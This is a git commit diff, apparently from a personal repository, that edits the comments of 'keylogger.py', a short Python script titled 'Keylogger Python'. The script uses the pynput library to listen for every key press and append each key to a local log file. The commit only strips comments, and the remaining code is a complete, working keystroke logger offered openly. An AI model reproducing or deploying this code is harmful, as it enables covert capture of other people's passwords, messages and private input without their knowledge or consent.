d12465af0f28d9f5e427b3e19db9971da791b47a
WelquerJunio <welquerrodrigues.05@gmail.com>
2019-03-23 23:20:14 -0300

    Ajustes em comentarios do codigo

--- keylogger.py
+++ keylogger.py
@@ -1,23 +1,16 @@
-﻿####################################################################
+####################################################################
 #                      Keylogger Python                            #
 ####################################################################
 
 #Importando a biblioteca pynput, e o método Listener.
 from pynput.keyboard import Listener
 
-#Localização onde será salvo o arquivo de log
 logFile = "Caminho do txt"
 
-#Função para receber tecla pressionada
 def writeLog(key):
-    #Convertendo a tecla pressionada p/ string
     keydata = str(key)
-
-    #Arquivo de log
     with open(logFile, "a") as f:
         f.write(keydata)
-
-#Escutando o evento on_press
-#no momento que o evento on_press ocorrer, chamar a função writeLog acima
+        
 with Listener(on_press=writeLog) as l:
     l.join()
